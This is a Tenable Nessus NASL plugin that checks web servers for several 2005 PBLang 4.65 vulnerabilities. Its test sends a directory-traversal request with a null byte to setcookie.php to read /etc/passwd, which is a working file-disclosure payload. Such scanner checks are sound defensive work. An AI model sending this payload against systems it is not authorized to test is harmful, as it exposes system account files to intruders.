#
# (C) Tenable Network Security
#



include("compat.inc");

if (description) {
  script_id(19594);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2005-2892", "CVE-2005-2893", "CVE-2005-2894", "CVE-2005-2895");
  script_bugtraq_id(14765, 14766);
  script_xref(name:"OSVDB", value:"19269");
  script_xref(name:"OSVDB", value:"19270");
  script_xref(name:"OSVDB", value:"19271");
  script_xref(name:"OSVDB", value:"19272");

  script_name(english:"PBLang 4.65 Multiple Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that suffers from
multiple flaws." );
 script_set_attribute(attribute:"description", value:
"The remote host is running PBLang, a bulletin board system that uses
flat files and is written in PHP. 

The version of PBLang installed on the remote suffers from several
vulnerabilities, including remote code execution, information
disclosure, cross-site scripting, and path disclosure." );
 script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/pblang465.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2005-09/0078.html" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  summary["english"] = "Checks for multiple vulnerabilities in PBLang";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw in setcookie.php to read /etc/passwd.
  r = http_send_recv3(method: "GET", 
    item:string(
      dir, "/setcookie.php?",
      "u=../../../../../../../../../../../../etc/passwd%00&",
      "plugin=", SCRIPT_NAME
    ),
    port:port
  );
  if (isnull(r)) exit(0);

  # There's a problem if there's an entry for root.
  if (egrep(string: r[2], pattern: "root:.*:0:[01]:")) {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    exit(0);
  }
}
